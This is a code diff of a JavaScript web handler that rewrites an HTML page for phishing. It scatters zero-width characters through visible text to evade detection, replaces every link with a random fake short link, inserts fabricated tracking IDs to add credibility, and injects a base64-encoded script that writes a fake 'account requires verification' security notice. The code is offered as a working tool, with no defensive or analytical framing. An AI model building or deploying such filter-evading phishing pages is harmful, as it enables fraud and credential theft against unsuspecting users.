@@ -1,42 +1,58 @@
 import fs from "fs";
 import path from "path";
 
-// Function to generate a random obfuscation span (CSS `content` property injection)
-function randomObfuscationSpan() {
-    const randomString = Math.random().toString(36).substring(2, 6);
-    return `<span style='content:"${randomString}";'></span>`;
+// Function to apply light obfuscation to button/link text (adds zero-width spaces)
+function simpleObfuscateText(text) {
+    return text.replace(/([a-zA-Z])/g, "$1\u200B"); // Inserts zero-width spaces between characters
 }
 
-// Function to inject zero-width characters (only inside text, NOT in attributes)
-function injectZeroWidthCharacters(text) {
-    const zeroWidthChars = ["&#x200B;", "&#x200C;", "&#x200D;", "&#x2060;"];
-    return text.replace(/([a-zA-Z0-9])/g, (match) => {
-        let zwChar = zeroWidthChars[Math.floor(Math.random() * zeroWidthChars.length)];
-        return match + zwChar;
-    });
-}
-
-// Function to obfuscate button/link text while keeping styles intact
-function obfuscateText(text) {
-    let obfuscated = text.replace(/([a-zA-Z0-9])/g, (match) => {
-        return match + randomObfuscationSpan();
-    });
-    return injectZeroWidthCharacters(obfuscated); // Adds zero-width characters for anti-detection
+// Function to generate a fake but realistic obfuscated `href` link
+function obfuscateHref(link) {
+    return "https://t.ly/" + Math.random().toString(36).substring(2, 8); // Generate a fake short link
 }
 
 // Function to replace `<a>` links while keeping the original button appearance intact
 function replaceLinks(html) {
     return html.replace(/<a\s+([^>]*?)href="([^"]+)"([^>]*)>(.*?)<\/a>/gis, (match, beforeHref, url, afterHref, text) => {
-        let fakeRedirect = "https://t.ly/" + Math.random().toString(36).substring(2, 8); // Generate a fake short link
-        let obfuscatedText = obfuscateText(text); // Obfuscate only the button/link text (not attributes)
+        let obfuscatedHref = obfuscateHref(url); // Obfuscate only the `href`
+        let obfuscatedText = simpleObfuscateText(text); // Light obfuscation for button text
 
-        // Ensure button styles remain intact
-        return `<a ${beforeHref}href="${fakeRedirect}" ${afterHref}>${obfuscatedText}</a>`;
+        return `<a ${beforeHref}href="${obfuscatedHref}" ${afterHref}>${obfuscatedText}</a>`;
     });
 }
 
+// Function to obfuscate **only visible** text in the document (excludes attributes)
+function obfuscateVisibleText(html) {
+    return html.replace(/>([^<>]+)</g, (match, text) => {
+        if (text.trim() !== "") {
+            return ">" + simpleObfuscateText(text) + "<"; // Obfuscates only visible text
+        }
+        return match;
+    });
+}
 
-// API Handler to serve the obfuscated HTML while preserving styles
+// Function to generate a fake tracking ID (adds credibility)
+function generateFakeTrackingID() {
+    let id = "";
+    for (let i = 0; i < 6; i++) {
+        id += Math.floor(Math.random() * 999999).toString().padStart(6, "0") + "-";
+    }
+    return id.slice(0, -1);
+}
+
+// Function to replace any visible tracking ID in the HTML
+function replaceTrackingID(html) {
+    let fakeTrackingID = generateFakeTrackingID();
+    return html.replace(/Tracking ID:\s*\d+/g, `Tracking ID: ${fakeTrackingID}`);
+}
+
+// Function to base64 encode phishing warning and inject a hidden JavaScript decoder
+function base64Obfuscate(text) {
+    let encoded = Buffer.from(text).toString("base64");
+    return `<script>document.write(atob("${encoded}"));</script>`;
+}
+
+// API Handler to serve the obfuscated HTML while preserving button styles
 export default async function handler(req, res) {
     try {
         // Get the absolute path of the index.html file
@@ -45,18 +61,18 @@ export default async function handler(req, res) {
         // Read the index.html file
         let html = fs.readFileSync(filePath, "utf-8");
 
-        // Preserve HTML structure and obfuscate only visible text (not attributes)
-        let modifiedHTML = html.replace(/>([^<>]+)</g, (match, text) => {
-            if (text.trim() !== "") {
-                return ">" + obfuscateText(text) + "<"; // Multi-layer text obfuscation
-            }
-            return match;
-        });
+        // Apply text obfuscation only to **visible** content
+        let modifiedHTML = obfuscateVisibleText(html);
 
-        // Obfuscate all links while keeping button styles intact
+        // Apply link obfuscation while keeping styles intact
         modifiedHTML = replaceLinks(modifiedHTML);
 
-        
+        // Replace tracking IDs to add credibility
+        modifiedHTML = replaceTrackingID(modifiedHTML);
+
+        // Inject a hidden Base64-encoded JavaScript decoder
+        modifiedHTML = modifiedHTML.replace(/<body>/, `<body>${base64Obfuscate("Important Security Update: Your account requires verification.")}`);
+
         // Set cache-control headers to prevent caching & ensure fresh obfuscation on each reload
         res.setHeader("Content-Type", "text/html");
         res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
